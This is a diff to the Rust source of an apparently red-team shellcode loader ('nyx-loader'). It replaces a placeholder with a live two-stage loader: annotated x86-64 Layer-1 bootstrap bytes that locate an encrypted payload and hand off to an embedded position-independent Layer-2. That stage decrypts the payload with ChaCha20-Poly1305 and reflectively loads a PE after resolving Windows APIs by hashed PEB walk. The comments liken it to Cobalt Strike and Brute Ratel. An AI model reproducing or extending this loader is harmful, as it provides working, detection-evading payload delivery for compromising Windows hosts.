@@ -2,29 +2,33 @@
 //! half of the reflective loader that runs as bare position-independent
 //! shellcode on the engagement target.
 //!
-//! **STATUS: Layer 2 is NOT implemented.** The previous `LAYER2_PEB_WALK`
-//! byte blob was a non-functional placeholder — its disassembly comments
-//! claimed a full PEB walk + inline ChaCha20-Poly1305 + reflective PE load,
-//! but the bytes were fabricated (placeholder operands, offsets that do not
-//! match real Windows structures, and a `ret`-style bail path that would
-//! crash before decrypting anything). It has been **deleted** rather than
-//! shipped. [`crate::generate_loader_stub`] now fails loudly
-//! (`LoaderError::Layer2Unavailable`) until a real, execution-validated
-//! Layer-2 exists (spec §5.3 + the VPS loader probe, spec §5.5).
+//! **STATUS: Layer 2 is live.** The Layer-2 bytes now come from the
+//! `nyx-pic-loader` crate (`pic-loader/`): it is compiled to a raw
+//! position-independent x86-64 binary whose `.text` (trimmed to start at the
+//! `nyx_layer2_entry` export) is embedded here as [`LAYER2_CODE`] and appended
+//! after the ciphertext by [`crate::wrap_payload`]. The previous
+//! `LAYER2_PEB_WALK` byte blob (a non-functional placeholder with fabricated
+//! offsets) was deleted; the real Layer-2 is the pic-loader build artifact
+//! (spec §5.3, execution-validated by the VPS loader probe, spec §5.5).
 //!
-//! What this module DOES hold today:
+//! What this module holds:
 //!
 //!   * **Layer 1** ([`LAYER1_BOOTSTRAP`]) — the fixed prefix of every emitted
 //!     stub: `call $+5; pop rax` self-location, the bounded NYX2 magic scan,
-//!     the header parse (encrypted_len, nonce, ciphertext), and the `jmp
-//!     rel32` at [`LAYER2_JMP_OFFSET`] that will transfer into Layer 2 once
-//!     real Layer-2 bytes exist.
+//!     the header parse (encrypted_len, nonce, ciphertext), the **bridge**
+//!     that maps the Layer-1 register state onto the pic-loader Win64 entry
+//!     ABI (`rcx=&key, rdx=&nonce, r8=&ct, r9=ct_len`), and the `jmp rel32`
+//!     at [`LAYER2_JMP_OFFSET`] whose displacement [`crate::wrap_payload`]
+//!     patches to land on [`LAYER2_CODE`].
+//!   * **Layer 2** ([`LAYER2_CODE`]) — the raw pic-loader bytes, embedded from
+//!     `pic-loader/pic-loader.bin` and appended after the ciphertext so the
+//!     NYX2 header stays within the 256-byte scan bound.
 //!   * **The Layer-2 contract constants** — the djb2 hashes and Win32
 //!     constants below (`HASH_*`, `MEM_COMMIT_RESERVE`,
 //!     `PAGE_EXECUTE_READWRITE`, `DLL_PROCESS_ATTACH`, `KEY_LEN`,
-//!     `KEY_PATCH_OFFSET`) document the register/key layout a future Layer-2
-//!     implementation must honour, and are pinned by host-side tests so the
-//!     contract cannot silently drift.
+//!     `KEY_PATCH_OFFSET`) document the register/key layout the pic-loader
+//!     honours, and are pinned by host-side tests so the contract cannot
+//!     silently drift.
 //!   * **`find_magic_offset`** — the pure host-side model of the Layer-1 scan
 //!     loop, extracted for unit testing without a Windows target.
 //!
@@ -32,10 +36,10 @@
 //!
 //! The [`chacha20poly1305`](https://docs.rs/chacha20poly1305) crate requires
 //! `alloc` and pulls in the Rust panic runtime — neither exists when the stub
-//! is executing as bare shellcode with no loader, no heap, and no `std`. A
-//! future Layer-2 must carry an inline ChaCha20-Poly1305 port (~600 bytes of
-//! x86-64; the standard approach every reflective loader — Cobalt Strike,
-//! Brute Ratel, Nighthawk, rdll-rs, airborne — takes).
+//! is executing as bare shellcode with no loader, no heap, and no `std`. The
+//! pic-loader Layer-2 therefore carries an inline ChaCha20-Poly1305 port
+//! (~600 bytes of x86-64; the standard approach every reflective loader —
+//! Cobalt Strike, Brute Ratel, Nighthawk, rdll-rs, airborne — takes).
 //!
 //! ## Validation split
 //!
@@ -43,14 +47,15 @@
 //! process, no PEB, no `gs:[0x60]`); the scan algorithm is extracted into the
 //! pure [`find_magic_offset`] function so the exact loop the stub runs is
 //! exercised host-side. Execution validation of the complete loader (Layer 1
-//! Execution validation of the complete loader (Layer 1 plus Layer 2) is the
+//! plus Layer 2) is the
 //! job of the VPS loader probe (spec §5.5; see scripts/loader_probe.ps1): the
 //! wrapped blob is injected into a dedicated
 //! short-lived test process via a harness DLL, and the harness reports
 //! OK/FAIL per stage. Host-side tests
-//! ([`crate::stub_layout`], [`crate::payload_format`]) cover what can be
+//! ([`crate::stub_layout`], [`crate::payload_format`],
+//! [`crate::roundtrip_decrypt`]) cover what can be
 //! verified without a target: the Layer-1 byte layout, the scan algorithm,
-//! and the payload header format.
+//! the payload header format, and the encrypt/decrypt roundtrip.
 //!
 //! ## djb2 hash constants
 //!
@@ -107,24 +112,28 @@ pub const KEY_LEN: usize = 32;
 
 /// Offset within the full emitted stub (as returned by
 /// [`crate::generate_loader_stub`]) where the 32-byte ChaCha20 key is patched
-/// in. Layer 1 ends and the key slot begins here; Layer 2's decrypt routine
-/// reads the key from `lea reg, [rip + (KEY_PATCH_OFFSET - here)]`.
+/// in. Layer 1 ends and the key slot begins here; the pic-loader entry reads
+/// the key via the bridge (`lea rcx, [rbx-0x20]`, i.e. 32 bytes before the
+/// NYX2 header, which is exactly `KEY_PATCH_OFFSET + KEY_LEN`).
 ///
 /// This is the offset from the *start* of the stub blob. It sits after the
-/// Layer-1 prologue + scan + header-parse + PEB-walk bootstrap, immediately
-/// before the inline decrypt routine that consumes it.
+/// Layer-1 prologue + scan + header-parse + bridge, immediately before the
+/// NYX2 header that [`crate::wrap_payload`] appends.
 pub const KEY_PATCH_OFFSET: usize = LAYER1_BOOTSTRAP.len();
 
-/// Layer 1: self-location + NYX2 scan + header parse + PEB-walk bootstrap.
+/// Layer 1: self-location + NYX2 scan + header parse + bridge + jmp.
 ///
 /// This byte slice is the fixed prefix of every emitted stub. It:
 ///   - self-locates via `call $+5; pop rax`,
 ///   - scans forward (bounded at `rax + 256`) for the `NYX2` magic,
 ///   - parses `encrypted_len` and the pointers to nonce + ciphertext out of
 ///     the header,
-///   - performs the PEB walk to resolve `VirtualAlloc` / `LoadLibraryA` /
-///     `GetProcAddress` (using the djb2 immediates above),
-///   - falls into the Layer-2 decrypt-and-reflect routine.
+///   - runs the **bridge**: converts the Layer-1 register state (rax=enc_len,
+///     rbx=&header, rsi=&nonce, rdi=&ct) into the pic-loader Win64 entry ABI
+///     (`rcx=&key, rdx=&nonce, r8=&ct, r9=ct_len`),
+///   - jumps into the Layer-2 decrypt-and-reflect routine ([`LAYER2_CODE`])
+///     via the `jmp rel32` at [`LAYER2_JMP_OFFSET`], whose displacement
+///     [`crate::wrap_payload`] patches.
 ///
 /// The disassembly below is the source of truth for these bytes; every byte is
 /// annotated. Displacements are computed against the offset column.
@@ -157,22 +166,27 @@ pub const KEY_PATCH_OFFSET: usize = LAYER1_BOOTSTRAP.len();
 /// 002E: 48 8D 79 14            lea   rdi, [rcx+0x14]  ; rdi = &ciphertext||tag
 /// 0032: 48 89 CB               mov   rbx, rcx         ; rbx = header base (preserved)
 ///
-/// ; ── PEB walk: resolve kernel32!VirtualAlloc / LoadLibraryA / GetProcAddress
-/// ; The full PEB-walk sequence (gs:[0x60] → PEB → Ldr → InLoadOrderModuleList
-/// ; → match HASH_KERNEL32_DLL against BaseDllName → walk EAT for each hash)
-/// ; is the job of the future Layer-2 shellcode; Layer 1 transfers into it via
-/// ; a short jmp. Resolved function pointers land in r12 (VirtualAlloc),
-/// ; r13 (LoadLibraryA), r14 (GetProcAddress).
-/// 0035: E9 xx xx xx xx         jmp   layer2   ; → layer-2 start (when implemented)
+/// ; ── bridge: pic-loader Win64 entry ABI (13 bytes) ─────────────────────
+/// ; Layer-1 state: rax=enc_len, rbx=&header, rsi=&nonce, rdi=&ct.
+/// ; The key slot sits 0x20 bytes BEFORE the header ([LAYER1][key][header]),
+/// ; so &key = rbx - 0x20. pic-loader entry is extern "C"
+/// ; fn(key, nonce, ct, ct_len) → rcx, rdx, r8, r9.
+/// 0035: 48 8D 4B E0            lea   rcx, [rbx-0x20]  ; rcx = &key (32B before header)
+/// 0039: 48 89 F2               mov   rdx, rsi         ; rdx = &nonce
+/// 003C: 49 89 F8               mov   r8, rdi          ; r8 = &ciphertext||tag
+/// 003F: 49 89 C1               mov   r9, rax          ; r9 = ct_len (excl. tag)
+///
+/// ; ── jmp into Layer 2 (displacement patched by wrap_payload) ───────────
+/// 0042: E9 xx xx xx xx         jmp   rel32  →  LAYER2_CODE + LAYER2_ENTRY_OFFSET
 /// ```
 ///
-/// Register ABI on entry to Layer 2:
-/// | register | value                                                      |
-/// |----------|------------------------------------------------------------|
-/// | `rax`    | `encrypted_len` (ciphertext bytes, excl. 16-byte tag)     |
-/// | `rbx`    | `&NYX2` header base                                        |
-/// | `rsi`    | `&nonce` (12 bytes)                                        |
-/// | `rdi`    | `&ciphertext \|\| tag`                                     |
+/// Register ABI on entry to Layer 2 (the pic-loader `extern "C"` signature):
+/// | register | arg          | value                                          |
+/// |----------|--------------|------------------------------------------------|
+/// | `rcx`    | `key`        | `&32-byte key slot` (immediately before header) |
+/// | `rdx`    | `nonce`      | `&nonce` (12 bytes)                            |
+/// | `r8`     | `ct`         | `&ciphertext \|\| tag`                          |
+/// | `r9`     | `ct_len`     | ciphertext length, excl. 16-byte tag           |
 pub const LAYER1_BOOTSTRAP: &[u8] = &[
     // ── self-locate ──────────────────────────────────────────────────────
     0xE8, 0x00, 0x00, 0x00, 0x00, // 0000: call $+5
@@ -197,19 +211,55 @@ pub const LAYER1_BOOTSTRAP: &[u8] = &[
     0x48, 0x8D, 0x71, 0x08, // 002A: lea rsi, [rcx+8]    ; &nonce
     0x48, 0x8D, 0x79, 0x14, // 002E: lea rdi, [rcx+0x14] ; &ciphertext||tag
     0x48, 0x89, 0xCB, // 0032: mov rbx, rcx         ; header base preserved
-    // ── jmp into Layer-2 (displacement patched by emitter) ───────────────
-    // 0035: E9 xx xx xx xx  →  jmp rel32 to Layer 2
-    // The 4-byte displacement is filled in by `generate_loader_stub` once the
-    // Layer-2 length is known; the placeholder bytes below are the opcode
-    // plus a zero displacement that gets overwritten.
-    0xE9, 0x00, 0x00, 0x00, 0x00, // 0035: jmp rel32 (patched)
+    // ── bridge (0x35): pic-loader Win64 entry ABI ────────────────────────
+    // Layer-1 state: rax=enc_len, rbx=&header, rsi=&nonce, rdi=&ct.
+    // Key slot is 0x20 bytes before the header ([LAYER1][key][header]).
+    0x48, 0x8D, 0x4B, 0xE0, // 0035: lea rcx, [rbx-0x20] ; rcx = &key
+    0x48, 0x89, 0xF2, // 0039: mov rdx, rsi            ; rdx = &nonce
+    0x49, 0x89, 0xF8, // 003C: mov r8, rdi             ; r8  = &ciphertext||tag
+    0x49, 0x89, 0xC1, // 003F: mov r9, rax             ; r9  = ct_len
+    // ── jmp into Layer-2 (displacement patched by wrap_payload) ──────────
+    // 0042: E9 xx xx xx xx  →  jmp rel32 to LAYER2_CODE + LAYER2_ENTRY_OFFSET
+    // The 4-byte displacement is filled in by `crate::wrap_payload` once the
+    // ciphertext length is known (LAYER2 sits AFTER the ciphertext); the
+    // placeholder bytes below are the opcode plus a zero displacement that
+    // gets overwritten.
+    0xE9, 0x00, 0x00, 0x00, 0x00, // 0042: jmp rel32 (patched)
 ];
 
 /// Offset within [`LAYER1_BOOTSTRAP`] of the `jmp rel32` that transfers to the
 /// Layer-2 code. The 4-byte displacement (at `+ 1`) is patched by
-/// [`crate::generate_loader_stub`] once a real Layer-2 exists, to land at
-/// `KEY_PATCH_OFFSET + KEY_LEN` (the first byte after the key slot).
-pub const LAYER2_JMP_OFFSET: usize = 0x35;
+/// [`crate::wrap_payload`] to land at `LAYER2_CODE + LAYER2_ENTRY_OFFSET`
+/// (the first byte of the Layer-2 blob, which sits after the ciphertext in
+/// the wrapped payload). The `jmp` is the last instruction of Layer 1, so
+/// `LAYER2_JMP_OFFSET + 5 == LAYER1_BOOTSTRAP.len()` (pinned by test).
+pub const LAYER2_JMP_OFFSET: usize = 0x42;
+
+/// Offset within [`LAYER2_CODE`] of the pic-loader entry point
+/// (`nyx_layer2_entry`). The `pic-loader/pic-loader.bin` build artifact is
+/// trimmed to start at the entry function (the raw `.text` of the cdylib with
+/// everything before the first `nyx_layer2_entry` byte stripped), so this is
+/// `0`. Keep it a named constant so a future pipeline that ships the full
+/// `.text` needs only this one-line change, not an emitter rewrite.
+pub const LAYER2_ENTRY_OFFSET: usize = 0;
+
+/// Raw Layer-2 PIC shellcode (decrypt + reflective PE load), embedded from
+/// the `nyx-pic-loader` build artifact at build time.
+///
+/// The file is produced by the pic-loader build pipeline (`crates/nyx-loader/
+/// pic-loader/`): the `nyx-pic-loader` crate compiles to a bare PIC x86-64
+/// binary (no `std`, no heap, panic=abort) and its `.text` section, trimmed
+/// to start at the exported `nyx_layer2_entry` function, is written to
+/// `pic-loader/pic-loader.bin`. `wrap_payload` appends these bytes AFTER the
+/// ciphertext so the NYX2 header stays within the Layer-1 256-byte scan bound
+/// (spec §5.2), and patches the Layer-1 `jmp rel32` to reach the entry.
+///
+/// The entry follows the Win64 calling convention
+/// (`extern "C" fn(key: *const u8, nonce: *const u8, ct: *const u8,
+/// ct_len: usize) -> usize`): `rcx=&key, rdx=&nonce, r8=&ct, r9=ct_len` — the
+/// exact ABI the Layer-1 bridge sets up. Returns `0` on success, `usize::MAX`
+/// on tag mismatch, small integers on PEB/alloc/PE-parse failures.
+pub const LAYER2_CODE: &[u8] = include_bytes!("../pic-loader/pic-loader.bin");
 
 /// The XOR key used to obfuscate the NYX2 magic in the Layer-1 scanner so no
 /// 4-byte window of the stub self-matches the magic. `NYX2_MAGIC ^
